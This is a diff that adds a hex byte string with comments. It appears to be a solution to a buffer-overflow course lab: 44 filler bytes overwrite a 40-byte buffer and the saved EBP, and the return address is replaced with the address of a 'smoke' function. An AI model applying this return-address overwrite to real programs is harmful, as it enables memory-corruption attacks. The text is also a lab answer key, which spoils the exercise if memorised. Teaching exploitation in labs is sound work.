@@ -1,0 +1,4 @@
+/* buf size is 0x28 = 40 bytes */
+/* 41-44 bytes' value is arbitrary, cover the old EBP value */
+/* I only need to set 45-48 bytes as smoke_Func address */
+00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 90 8c 04 08
